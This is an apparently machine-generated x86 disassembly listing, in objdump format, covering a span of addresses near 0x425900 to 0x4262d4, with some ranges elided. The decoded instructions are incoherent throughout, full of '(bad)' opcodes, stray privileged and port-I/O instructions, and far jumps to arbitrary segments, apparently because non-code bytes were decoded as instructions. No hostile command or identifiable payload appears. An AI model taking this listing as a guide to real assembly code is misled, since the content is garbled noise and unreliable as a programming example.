  42590c:	int    0x2c
  42590e:	inc    eax
  42590f:	sub    eax,0x531272b5
  425914:	xchg   ebx,eax
  425915:	inc    edx
  425916:	add    eax,0xb5ab8158
  42591b:	and    edx,edi
  42591d:	jae    0x425964
  42591f:	or     DWORD PTR ds:[eax-0x4d],0x7e
  425924:	pop    esi
  425925:	push   es
  425926:	push   esp
  425927:	lahf   
  425928:	push   ds
  425929:	js     0x425956
  42592b:	aaa    
  42592c:	cmp    DWORD PTR [eax],edi
  42592e:	pop    ebp
  425930:	(bad)  
  425931:	test   BYTE PTR [edx+0x4b105164],0x99
  425938:	fwait
  425939:	mov    WORD PTR [eax+eax*8+0x79],es
  42593d:	dec    ebx
  42593e:	cmp    eax,0x1641649f
  425943:	cmp    bh,BYTE PTR [edx]
  425945:	jl     0x4259a4
  425947:	jg     0x425917
  425949:	shl    DWORD PTR [edi+0x79],0xc0
  42594d:	mov    al,ds:0x699c1ff0
  425952:	pop    edi
  425953:	nop
  425954:	stos   DWORD PTR es:[edi],eax
  425955:	sub    eax,0xf220e990
  42595a:	lea    ebp,[ebx+0x9]
  42595d:	push   ds
  42595e:	mov    ?,WORD PTR [edx+0x12a92669]
  425964:	xchg   edi,eax
  425965:	jno    0x42594a
  425967:	mov    al,ds:0x9e11a1b8
  42596c:	sahf   
  42596d:	sbb    DWORD PTR [ecx-0x3a9afe94],ebx
  425973:	cli    
  425974:	lahf   
  425975:	(bad)
  425978:	xchg   bh,al
  42597a:	rcr    dl,cl
  42597c:	mov    bh,0xaa
  42597e:	jbe    0x425913
  425980:	icebp  
  425981:	jge    0x42594e
  425983:	pop    esi
  425984:	dec    ebp
  425985:	adc    edi,DWORD PTR [edx-0x76]
  425988:	inc    ebx
  425989:	xor    dh,BYTE PTR [edi+0x3444f046]
  42598f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425990:	nop
  425991:	or     dh,BYTE PTR [eax]
  425993:	inc    edi
  425994:	dec    ebx
  425995:	mov    ds:0xc2bd625a,al
  42599a:	ret    0x6708
  42599d:	fsubr  QWORD PTR [edi]
  42599f:	xchg   esi,eax
  4259a0:	into   
  4259a1:	sub    DWORD PTR [eax+0x53],ecx
  4259a4:	xchg   edi,eax
  4259a5:	xor    ch,dl
  4259a7:	cmp    BYTE PTR [edx-0x44114c97],dl
  4259ad:	or     esp,ebp
  4259af:	push   edx
  4259b0:	or     edi,DWORD PTR es:[edi-0x2cb3240a]
  4259b7:	daa    
  4259b8:	ja     0x42593c
  4259ba:	bound  esi,QWORD PTR [ebp+0x5f85fe4b]
  4259c0:	stc    
  4259c1:	pop    DWORD PTR [edi]
  4259c3:	dec    esi
  4259c4:	arpl   WORD PTR [eax-0x2f9075b3],si
  4259ca:	sar    BYTE PTR [edi-0x5d21073d],1
  4259d0:	lea    esi,[edx+0x3fe46852]
  4259d6:	xor    DWORD PTR [edx],ebp
  4259d8:	cdq    
  4259d9:	xor    ecx,DWORD PTR [edi*2-0x27fa837d]
  4259e0:	enter  0x6446,0x92
  4259e4:	and    al,0x8d
  4259e6:	push   esi
  4259e7:	sbb    eax,DWORD PTR [esi-0x2e70147f]
  4259ed:	inc    esi
  4259ee:	jo     0x425a36
  4259f0:	inc    eax
  4259f1:	push   esi
  4259f2:	mov    al,0x57
  4259f4:	aad    0xb2
  4259f6:	push   cs
  4259f7:	rcl    ebx,cl
  4259f9:	cmp    eax,0x3af2102b
  4259fe:	jne    0x4259c6
  425a00:	push   esp
  425a01:	cdq    
  425a02:	ficomp WORD PTR [ebx+0x70]
  425a05:	adc    cl,ah
  425a07:	out    dx,eax
  425a08:	push   ecx
  425a09:	inc    ecx
  425a0a:	out    0x7d,eax
  425a0c:	add    ah,ah
  425a0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a0f:	jl     0x425a11
	...
  425a71:	add    BYTE PTR [eax],al
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x79553dfc]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	add    BYTE PTR [ebp+0x4c32a0c],0x8b
  425a93:	mov    ch,0xd1
  425a95:	leave  
  425a96:	pop    edx
  425a97:	pop    ds
  425a98:	mov    bh,0xca
  425a9a:	(bad)  
  425a9b:	lock jg 0x425a2b
  425a9e:	adc    al,0x49
  425aa0:	mov    bh,BYTE PTR [ebx+0x8]
  425aa3:	stc    
  425aa4:	adc    al,0x94
  425aa6:	and    DWORD PTR [esi],esp
  425aa8:	lods   al,BYTE PTR ds:[esi]
  425aa9:	push   ss
  425aaa:	lods   eax,DWORD PTR ds:[esi]
  425aab:	pcmpgtb mm3,mm4
  425aae:	sub    BYTE PTR [ecx],bh
  425ab0:	add    DWORD PTR ds:0x5d434724,ebx
  425ab6:	ret    0xed9e
  425ab9:	outs   dx,BYTE PTR ds:[esi]
  425aba:	into   
  425abb:	je     0x425aeb
  425abd:	pop    ecx
  425abe:	pushf  
  425abf:	mov    ebx,0x6e8e549c
  425ac4:	out    dx,al
  425ac5:	mov    al,0xfe
  425ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ac8:	mov    cl,0x42
  425aca:	dec    esp
  425acb:	push   eax
  425acc:	add    edx,ecx
  425ace:	pop    edi
  425acf:	pop    edi
  425ad0:	mov    ebx,DWORD PTR [ebp+0x1e6505a5]
  425ad6:	sub    BYTE PTR [ecx+ebp*4],ch
  425ad9:	and    DWORD PTR [edi],edx
  425adb:	pop    ebp
  425add:	sbb    bl,dh
  425adf:	hlt    
  425ae0:	mov    bh,0x2b
  425ae2:	sbb    al,0x8d
  425ae4:	push   esp
  425ae5:	and    al,0xa0
  425ae7:	sub    DWORD PTR [ebx],esp
  425ae9:	add    edi,0xffffffd2
  425aec:	retf   
  425aed:	pushf  
  425aee:	push   ecx
  425aef:	mov    eax,0x20b3fa1f
  425af4:	adc    DWORD PTR [edx],eax
  425af6:	mov    ebp,0x867f08be
  425afb:	jne    0x425b14
  425afd:	or     al,0xec
  425aff:	push   esi
  425b00:	les    esi,FWORD PTR [esi-0x27]
  425b03:	mov    ebx,fs
  425b05:	icebp  
  425b06:	lea    ecx,[esi-0x6de897c9]
  425b0c:	rcr    DWORD PTR [ebp+edx*4+0x723e5f8e],1
  425b13:	xchg   ebx,eax
  425b14:	xor    edx,esi
  425b16:	in     al,dx
  425b17:	dec    esp
  425b18:	push   ebx
  425b19:	mul    ecx
  425b1b:	or     al,0x93
  425b1d:	sbb    al,0x39
  425b1f:	adc    al,0x15
  425b21:	bound  ebp,QWORD PTR [ebp-0x4a7f4d90]
  425b27:	cmp    DWORD PTR [eax+0x75],0x826ccfd3
  425b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b2f:	cld    
  425b30:	test   eax,0x2a9cf74d
  425b35:	fisttp DWORD PTR [ebp+0x7416399f]
  425b3b:	dec    ebp
  425b3c:	repz mov ds:0xb7b28bed,al
  425b42:	push   cs
  425b43:	push   esi
  425b44:	push   edi
  425b45:	(bad)  
  425b46:	call   0xba1e:0x1829fafc
  425b4d:	mov    ds:0x2124d31f,eax
  425b52:	lds    ebp,FWORD PTR ds:0x77dd286e
  425b58:	fisttp QWORD PTR ds:0xb7ebee06
  425b5e:	dec    edx
  425b5f:	inc    ecx
  425b60:	cwde   
  425b61:	pop    ebx
  425b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b63:	(bad)  
  425b65:	cmp    DWORD PTR [edx+ecx*4],0xffffffb6
  425b69:	dec    edx
  425b6a:	xlat   BYTE PTR ds:[ebx]
  425b6b:	push   cs
  425b6c:	mov    BYTE PTR [ecx],cl
  425b6e:	int3   
  425b6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b70:	sbb    ah,BYTE PTR [ebx]
  425b72:	ret    0x6478
  425b75:	jb     0x425b96
  425b77:	inc    ecx
  425b78:	inc    edx
  425b79:	dec    ebx
  425b7a:	mov    dl,0x16
  425b7c:	push   es
  425b7d:	cmc    
  425b7e:	mov    esi,0x39f077fd
  425b83:	cmp    al,0x19
  425b85:	ror    bh,0xa
  425b88:	gs jge 0x425ba9
  425b8b:	mov    BYTE PTR [esi],ch
  425b8d:	add    DWORD PTR [edx],ecx
  425b8f:	out    dx,eax
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	dec    edx
  425c01:	jmp    0x1:0x92d4f06b
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	dec    esp
  425c0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c0e:	cs test cl,ch
  425c11:	pop    esi
  425c12:	or     eax,0xf141098
  425c17:	mov    al,0x25
  425c19:	sub    eax,0xb502a83c
  425c1e:	call   0xe6b2:0xf28dafe9
  425c25:	out    dx,al
  425c26:	dec    esi
  425c27:	and    DWORD PTR [ebp+ebp*8-0x45601a1],ebp
  425c2e:	sub    BYTE PTR [edx],cl
  425c30:	fimul  DWORD PTR [ebx+0x58]
  425c33:	icebp  
  425c34:	xchg   esi,eax
  425c35:	sahf   
  425c36:	xlat   BYTE PTR ds:[ebx]
  425c37:	xchg   DWORD PTR [eax-0x7b],ecx
  425c3a:	test   DWORD PTR [ebx-0x2cc74600],edx
  425c40:	mov    ds:0xee0002cd,eax
  425c45:	dec    eax
  425c46:	daa    
  425c47:	sbb    al,0x64
  425c49:	retf   
  425c4a:	jecxz  0x425c4d
  425c4c:	add    BYTE PTR ds:0xac342555,cl
  425c52:	into   
  425c53:	or     eax,DWORD PTR [edi-0x3656c6c2]
  425c59:	dec    esi
  425c5a:	sub    dl,BYTE PTR [eax]
  425c5c:	dec    ecx
  425c5d:	mov    esp,0x78b7d84b
  425c62:	fistp  QWORD PTR [edx+0x422953a8]
  425c68:	cmp    al,0x3f
  425c6a:	das    
  425c6b:	and    al,0x9f
  425c6d:	stc    
  425c6e:	std    
  425c6f:	and    edi,DWORD PTR [ebp+0x46]
  425c72:	repz pop ebx
  425c74:	mov    ecx,0x626f5e91
  425c79:	or     edi,DWORD PTR [ebp-0x238b417a]
  425c7f:	lahf   
  425c80:	pop    edx
  425c81:	std    
  425c82:	fwait
  425c83:	imul   edi,DWORD PTR [edx],0xffffffed
  425c86:	jae    0x425c81
  425c88:	mov    cl,0x4b
  425c8a:	pop    edi
  425c8b:	sub    al,0x37
  425c8d:	lods   eax,DWORD PTR ds:[esi]
  425c8e:	sbb    eax,DWORD PTR [edx]
  425c90:	imul   ebp,DWORD PTR ds:0x70996194,0xffffff9d
  425c97:	push   ds
  425c98:	imul   ebx,DWORD PTR [edx],0xffffff8b
  425c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c9d:	call   0x16a69162
  425ca2:	(bad)
  425ca5:	loope  0x425d06
  425ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ca8:	pop    edx
  425ca9:	call   0xb1f2ebb7
  425cae:	xor    al,0xc8
  425cb0:	jecxz  0x425c94
  425cb2:	sbb    edi,DWORD PTR [edx-0x17]
  425cb5:	dec    edi
  425cb6:	xchg   ecx,eax
  425cb7:	iret   
  425cb8:	popa   
  425cb9:	add    ecx,0x68c4e89d
  425cbf:	pop    edi
  425cc0:	push   0x7f0f3eda
  425cc5:	xor    eax,0x257c5457
  425cca:	mov    dl,0x22
  425ccc:	xor    al,0xf5
  425cce:	daa    
  425ccf:	popf   
  425cd0:	lods   al,BYTE PTR ds:[esi]
  425cd1:	stos   BYTE PTR es:[edi],al
  425cd2:	rol    BYTE PTR [eax],0xfa
  425cd5:	pop    esp
  425cd6:	stos   BYTE PTR es:[edi],al
  425cd7:	test   eax,0x141d012e
  425cdc:	in     al,0xa9
  425cde:	fidivr DWORD PTR [edi-0x58]
  425ce1:	sub    cl,BYTE PTR [edx-0x31]
  425ce4:	inc    ebx
  425ce5:	adc    cl,BYTE PTR [eax+0x47]
  425ce8:	push   ecx
  425ce9:	ret    0xda51
  425cec:	xor    eax,0xbe532a92
  425cf1:	lds    esi,FWORD PTR ds:0xf53d1e69
  425cf7:	test   al,0x1
  425cf9:	mov    ah,0x29
  425cfb:	mov    ch,0x6a
  425cfd:	loopne 0x425d14
  425cff:	addr16 pop ecx
  425d01:	jmp    0x1e0:0xc938fb3f
  425d08:	outs   dx,DWORD PTR ds:[esi]
  425d09:	mov    ecx,edi
  425d0b:	jp     0x425d81
  425d0d:	mov    ebp,DWORD PTR [eax]
  425d0f:	jo     0x425d11
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x233e5e81,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	pop    edx
  425d8d:	outs   dx,BYTE PTR ds:[esi]
  425d8e:	gs retf 
  425d90:	add    eax,0x1a721186
  425d95:	or     eax,0x5aad3e20
  425d9a:	sbb    DWORD PTR [ecx],esi
  425d9c:	inc    ebx
  425d9d:	and    edx,esp
  425d9f:	(bad)  
  425da0:	aaa    
  425da1:	(bad)  [edi+0x3d]
  425da4:	add    DWORD PTR [ebx],eax
  425da6:	mov    ch,0x10
  425da8:	sbb    bl,BYTE PTR [esi+0x6c4e42bd]
  425dae:	and    BYTE PTR [esi],cl
  425db0:	push   es
  425db1:	iret   
  425db2:	in     al,0x85
  425db4:	push   ecx
  425db5:	stos   BYTE PTR es:[edi],al
  425db6:	cmp    edx,DWORD PTR [esp+ebx*8]
  425db9:	dec    eax
  425dba:	arpl   WORD PTR [ecx+0x9],dx
  425dbd:	sub    ecx,ecx
  425dbf:	mov    bl,0x13
  425dc1:	mov    ds,WORD PTR [eax-0x62]
  425dc4:	and    bl,BYTE PTR [ecx]
  425dc6:	cs jg  0x425dc3
  425dc9:	mov    esp,0xcacd16c2
  425dce:	jp     0x425e4d
  425dd0:	in     eax,0x67
  425dd2:	(bad)  
  425dd3:	bound  eax,QWORD PTR [ebx-0x36a44a32]
  425dd9:	repnz add DWORD PTR [ecx+eax*2],ebx
  425ddd:	test   al,0xcf
  425ddf:	lea    esp,[ecx]
  425de1:	call   FWORD PTR [edi]
  425de3:	cdq    
  425de4:	loopne 0x425d8f
  425de6:	hlt    
  425de7:	pop    es
  425de8:	xchg   esp,ebx
  425dea:	ds xor al,0xcd
  425ded:	hlt    
  425dee:	loop   0x425e57
  425df0:	inc    edx
  425df1:	jmp    0xba8f3e00
  425df6:	inc    esi
  425df7:	sub    ecx,ebx
  425df9:	mov    edi,0x6ebee635
  425dfe:	stos   BYTE PTR es:[edi],al
  425dff:	(bad)
  425e04:	cs cmc 
  425e06:	dec    eax
  425e07:	jecxz  0x425db7
  425e09:	ss add eax,0x90cade0e
  425e0f:	fmul   DWORD PTR [edx+0x424f03b4]
  425e15:	fs inc ebp
  425e17:	push   ds
  425e18:	mov    ecx,0x22ee93be
  425e1d:	inc    esi
  425e1e:	frstor [esi-0x54]
  425e21:	(bad)  
  425e22:	mov    WORD PTR [edx],gs
  425e24:	rcl    BYTE PTR [esi-0x4],1
  425e27:	add    BYTE PTR [eax-0x3e],al
  425e2a:	leave  
  425e2b:	adc    edx,DWORD PTR [ebx-0x4d]
  425e2e:	xor    BYTE PTR [eax-0x71],bh
  425e31:	inc    ebx
  425e32:	xchg   edx,eax
  425e33:	adc    al,0x40
  425e35:	call   0x6065c095
  425e3a:	bound  ebp,QWORD PTR [edx-0x7dfab4a3]
  425e40:	pusha  
  425e41:	add    ch,0x2f
  425e44:	jmp    0x9a20:0xaedb67ca
  425e4b:	adc    edx,DWORD PTR [esi+0x6e]
  425e4e:	lds    edx,FWORD PTR [edi-0x14]
  425e51:	rcr    BYTE PTR [eax+ebx*2+0x3a5c99ca],1
  425e58:	adc    DWORD PTR [eax],esi
  425e5a:	jg     0x425e64
  425e5c:	mov    dh,0x71
  425e5e:	xchg   edx,eax
  425e5f:	sub    eax,0x639e776f
  425e64:	mov    cl,0xa7
  425e66:	(bad)  
  425e67:	xchg   edx,eax
  425e68:	outs   dx,DWORD PTR ds:[esi]
  425e69:	mov    al,ds:0xc8e0f4e
  425e6e:	int3   
  425e6f:	mov    eax,ds:0xaadfd397
  425e74:	iret   
  425e75:	adc    dl,BYTE PTR [ebp+0x43777188]
  425e7b:	les    edx,FWORD PTR [ecx+0x1a4ddc9c]
  425e81:	mov    ebp,0x130e558f
  425e86:	out    dx,al
  425e87:	xor    edi,ebp
  425e89:	add    DWORD PTR [eax],ebp
  425e8b:	pop    ebp
  425e8c:	aam    0x55
  425e8e:	dec    esi
  425e8f:	pop    ebp
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	xchg   ebp,eax
  425f01:	out    0x98,al
  425f03:	mov    al,0xdc
  425f05:	xchg   esp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    al,0x1
  425f0a:	add    BYTE PTR [eax],al
  425f0c:	dec    esp
  425f0d:	pop    ss
  425f0e:	mov    ds:0x3df38cf5,al
  425f13:	inc    eax
  425f14:	sbb    al,0x66
  425f16:	lods   al,BYTE PTR ds:[esi]
  425f17:	rcl    esp,1
  425f19:	gs retf 
  425f1b:	jb     0x425f1d
  425f1d:	mov    ds:0xa9112a89,al
  425f22:	int    0xcb
  425f24:	stc    
  425f25:	pop    esp
  425f26:	mov    BYTE PTR [ecx+0x2b],ah
  425f29:	outs   dx,DWORD PTR ds:[esi]
  425f2a:	and    dh,0xfd
  425f2d:	hlt    
  425f2e:	sub    al,0x12
  425f30:	add    bh,BYTE PTR [ecx+esi*4+0x244ae072]
  425f37:	imul   esi,edi,0x9c0f057e
  425f3d:	arpl   WORD PTR [edi+eiz*2+0x186c4111],di
  425f44:	add    esp,DWORD PTR [edi]
  425f46:	jne    0x425ed3
  425f48:	add    eax,0xab957435
  425f4d:	shl    BYTE PTR [eax-0x6858817a],0x2f
  425f54:	fimul  DWORD PTR [esi]
  425f56:	jl     0x425fa4
  425f58:	ins    DWORD PTR es:[edi],dx
  425f59:	aad    0x85
  425f5b:	bound  esi,QWORD PTR [edx]
  425f5d:	ins    DWORD PTR es:[edi],dx
  425f5e:	call   0xaa0:0x9dc61eea
  425f65:	iret   
  425f66:	jecxz  0x425f69
  425f68:	je     0x425fdc
  425f6a:	aam    0x37
  425f6c:	test   eax,0xe1c39517
  425f71:	dec    esi
  425f72:	cs inc ecx
  425f74:	inc    ecx
  425f75:	ficom  DWORD PTR [edx]
  425f77:	clc    
  425f78:	and    eax,DWORD PTR [edi+0x55]
  425f7b:	test   al,0x83
  425f7d:	ss jp  0x425f64
  425f80:	icebp  
  425f81:	popf   
  425f82:	(bad)  [edi-0x628b95af]
  425f88:	test   al,0x27
  425f8a:	mov    esi,es
  425f8c:	mov    ah,0xca
  425f8e:	add    al,0xac
  425f90:	int    0x70
  425f92:	sub    DWORD PTR [eax],ebx
  425f94:	inc    esp
  425f95:	xor    eax,0x5eec477b
  425f9a:	lahf   
  425f9b:	arpl   WORD PTR [ebx],sp
  425f9d:	outs   dx,DWORD PTR ds:[esi]
  425f9e:	pop    ecx
  425f9f:	gs add eax,0x2a19696a
  425fa5:	rcr    BYTE PTR [ebx-0x3d58a600],cl
  425fab:	stc    
  425fac:	jle    0x425fd7
  425fae:	es pop ss
  425fb0:	xchg   ebx,eax
  425fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fb2:	gs in  eax,0x58
  425fb5:	cmp    eax,0xd6fcdf50
  425fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fbb:	mov    edi,esp
  425fbd:	pop    ecx
  425fbe:	dec    ecx
  425fbf:	cmp    esi,ebp
  425fc1:	xor    ch,al
  425fc3:	bound  ebx,QWORD PTR [ebx+0x687078b9]
  425fc9:	pop    eax
  425fca:	mov    ch,0x2d
  425fcc:	push   eax
  425fcd:	lods   eax,DWORD PTR ds:[esi]
  425fce:	sub    DWORD PTR [ecx-0x45729e05],esi
  425fd4:	pop    es
  425fd5:	jle    0x425fbb
  425fd7:	in     eax,0xda
  425fd9:	jb     0x42602a
  425fdb:	xchg   esi,eax
  425fdc:	stos   BYTE PTR es:[edi],al
  425fdd:	jo     0x425fa3
  425fdf:	loope  0x425fa4
  425fe1:	pushf  
  425fe2:	or     al,0xd8
  425fe4:	jno    0x42605e
  425fe6:	aas    
  425fe7:	push   cs
  425fe8:	popa   
  425fe9:	sahf   
  425fea:	add    BYTE PTR [edx],bl
  425fec:	jnp    0x42601b
  425fee:	call   0x876e:0xf89df098
  425ff5:	adc    ebp,DWORD PTR [eax]
  425ff7:	addr16 inc eax
  425ff9:	jae    0x42606b
  425ffb:	add    BYTE PTR [ebp+0x2fed19b1],dl
  426001:	inc    esp
  426002:	mov    ds:0x457d3d9c,al
  426007:	and    ebx,eax
  426009:	push   0x49
  42600b:	dec    esi
  42600c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42600d:	inc    esi
  42600e:	jne    0x425ffa
	...
  426074:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	in     eax,0xaa
  426082:	cmp    al,0x7
  426084:	loopne 0x42601b
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42608d:	sbb    eax,DWORD PTR [eax-0x482e9238]
  426093:	out    dx,eax
  426094:	inc    ebx
  426095:	mov    al,ds:0xd0144d39
  42609a:	(bad)  
  42609b:	jo     0x426102
  42609d:	pop    ebx
  42609e:	jl     0x426112
  4260a0:	pop    esi
  4260a1:	inc    eax
  4260a2:	stos   BYTE PTR es:[edi],al
  4260a3:	add    al,0x65
  4260a5:	adc    al,0x85
  4260a7:	sbb    ebx,DWORD PTR [ecx-0x679f3c3f]
  4260ad:	(bad)  
  4260ae:	sbb    BYTE PTR [eax-0x7],dh
  4260b1:	jecxz  0x42611b
  4260b3:	xchg   edi,eax
  4260b4:	adc    edx,DWORD PTR [edi+0x74]
  4260b7:	addr16 and eax,0x2542b316
  4260bd:	int3   
  4260be:	pop    edi
  4260bf:	pop    eax
  4260c0:	push   0xd81ecf39
  4260c5:	xor    DWORD PTR [eax],ebx
  4260c7:	and    ebp,eax
  4260c9:	inc    ebx
  4260ca:	ror    BYTE PTR [edx+ebx*8-0x3b],cl
  4260ce:	or     BYTE PTR [esi-0x35],ah
  4260d1:	cdq    
  4260d2:	dec    eax
  4260d3:	int    0x9a
  4260d5:	ss jb  0x42605c
  4260d8:	je     0x4260bd
  4260da:	push   0x23b511bf
  4260df:	popf   
  4260e0:	retf   0xc209
  4260e3:	pop    esp
  4260e4:	push   ds
  4260e5:	arpl   WORD PTR [esi+0x717cdc5],sp
  4260eb:	dec    eax
  4260ec:	mov    ecx,DWORD PTR [eax+0x11]
  4260ef:	adc    al,0xee
  4260f1:	adc    BYTE PTR [ebx+0x8],0xea
  4260f5:	jl     0x426170
  4260f7:	pop    ds
  4260f8:	pop    esi
  4260f9:	ins    DWORD PTR es:[edi],dx
  4260fa:	jp     0x426113
  4260fc:	mov    ah,BYTE PTR [ecx-0x6b177680]
  426102:	(bad)  
  426103:	or     eax,0x483a90b
  426108:	mov    bh,0x63
  42610a:	sti    
  42610b:	out    dx,eax
  42610c:	and    al,0xf5
  42610e:	fmul   st,st(2)
  426110:	lock sbb eax,0xbe7fbdb5
  426116:	test   DWORD PTR es:[ecx+ecx*1-0x39],0xd88986c6
  42611f:	outs   dx,DWORD PTR ds:[esi]
  426120:	mov    al,0x7
  426122:	jp     0x4260db
  426124:	cmp    DWORD PTR [edi+0x7fa54c98],ebp
  42612a:	cmp    DWORD PTR [ebx],edi
  42612c:	retf   
  42612d:	out    0xeb,eax
  42612f:	arpl   WORD PTR [edi+0x3517cd48],bx
  426135:	dec    ecx
  426136:	mov    bl,0x3e
  426138:	xchg   edi,eax
  426139:	data16 sbb bl,cl
  42613c:	mov    al,0xf8
  42613e:	xchg   ebp,eax
  42613f:	ss test al,0x55
  426142:	mov    ch,0xef
  426144:	sti    
  426145:	mov    edi,0x1000670f
  42614a:	retf   
  42614b:	xor    BYTE PTR [esi-0x743a0f2c],al
  426151:	jo     0x426156
  426153:	add    al,0x5a
  426155:	and    bl,al
  426157:	into   
  426158:	call   0xdf935d31
  42615d:	aas    
  42615e:	cwde   
  42615f:	out    dx,al
  426160:	ins    DWORD PTR es:[edi],dx
  426161:	dec    eax
  426162:	mov    gs,WORD PTR [eax]
  426164:	pop    esp
  426165:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426166:	dec    ebx
  426167:	hlt    
  426168:	pop    ebx
  426169:	icebp  
  42616a:	cmp    BYTE PTR [ebp+0x2e],al
  42616d:	inc    ebx
  42616e:	loope  0x42617c
  426170:	push   eax
  426171:	cld    
  426172:	add    dh,BYTE PTR [edx-0x72]
  426175:	mov    ebx,0xb4073041
  42617a:	xchg   BYTE PTR [eax+0xd],cl
  42617d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42617e:	rol    DWORD PTR [ecx-0x1c],1
  426181:	cmp    bh,BYTE PTR [edi]
  426183:	outs   dx,BYTE PTR ds:[esi]
  426184:	cmp    eax,0x7d9ca6f4
  426189:	imul   ah
  42618b:	sbb    dl,BYTE PTR [ebx-0x77]
  42618e:	xchg   edi,eax
  42618f:	sub    eax,0x0
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x3d2b2227],0x60
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	jne    0x4261bb
  42620e:	mov    edi,0x3a98cdde
  426213:	in     eax,dx
  426214:	sub    BYTE PTR [edx-0x3724077f],ch
  42621a:	repz mov ebp,0x488c0a1
  426220:	dec    edx
  426221:	jnp    0x4261d1
  426223:	xchg   ebx,eax
  426224:	out    dx,eax
  426225:	cmc    
  426226:	fwait
  426227:	dec    edi
  426228:	(bad)  
  426229:	nop
  42622a:	jge    0x426262
  42622c:	sub    DWORD PTR [ebp*1+0x499970d9],edx
  426233:	mov    BYTE PTR [edx+0x54],0x54
  426237:	ret    
  426238:	or     esp,DWORD PTR [esp+eiz*8]
  42623b:	xchg   ebp,eax
  42623c:	mov    bl,0x7e
  42623e:	fistp  WORD PTR [ebx+0x8a6aed6]
  426244:	jmp    FWORD PTR [ecx]
  426246:	(bad)  
  426248:	mov    ecx,0x42cae1f
  42624d:	jnp    0x426213
  42624f:	inc    edx
  426250:	daa    
  426251:	dec    ebp
  426252:	inc    ecx
  426253:	sub    DWORD PTR ss:[esi+ebx*1],eax
  426257:	out    0xc1,al
  426259:	bound  esi,QWORD PTR [ecx+0x26fde9b7]
  42625f:	enter  0xafe5,0x3b
  426263:	(bad)  
  426265:	icebp  
  426266:	pop    ebp
  426267:	sbb    al,0xc1
  426269:	or     dh,BYTE PTR [edx]
  42626b:	push   ss
  42626c:	outs   dx,BYTE PTR ds:[esi]
  42626d:	pop    esi
  42626e:	mov    ch,0x5a
  426270:	push   0x7c760b7c
  426275:	adc    DWORD PTR [ebp-0x5271227d],0x1b
  42627c:	sub    ebp,DWORD PTR [ecx-0x7a]
  42627f:	pop    ss
  426280:	push   eax
  426281:	rcr    BYTE PTR [edi],cl
  426283:	bound  eax,QWORD PTR [ecx+0x58]
  426286:	or     ebp,esi
  426288:	adc    bl,dl
  42628a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42628b:	mov    ebp,0xd6d5b75b
  426290:	lea    ebx,[edx]
  426292:	rcr    BYTE PTR [edi+0x1229f34c],cl
  426298:	out    0x47,al
  42629a:	and    al,0xb5
  42629c:	aam    0x6d
  42629e:	ins    DWORD PTR es:[edi],dx
  42629f:	pusha  
  4262a0:	out    0xa8,eax
  4262a2:	sub    al,0x6d
  4262a4:	mov    dl,BYTE PTR [esi-0x21ebeba9]
  4262aa:	repz and eax,DWORD PTR [edi]
  4262ad:	in     eax,0x3e
  4262af:	mov    esi,0x7d23a999
  4262b4:	mov    esp,0xf3b0099a
  4262b9:	(bad)  
  4262ba:	dec    esp
  4262bb:	in     al,0x2c
  4262bd:	inc    ebp
  4262be:	test   al,0xda
  4262c0:	push   ecx
  4262c1:	mov    eax,0x8dd6286d
  4262c6:	loope  0x426279
  4262c8:	pop    ebx
  4262c9:	lods   al,BYTE PTR ds:[esi]
  4262ca:	sub    al,0x8f
  4262cc:	or     BYTE PTR [eax],bh
  4262ce:	fwait
  4262cf:	(bad)  
  4262d0:	fadd   st(2),st
  4262d2:	int    0xbb
  4262d4:	add    DWORD PTR [eax-0x42],0x56
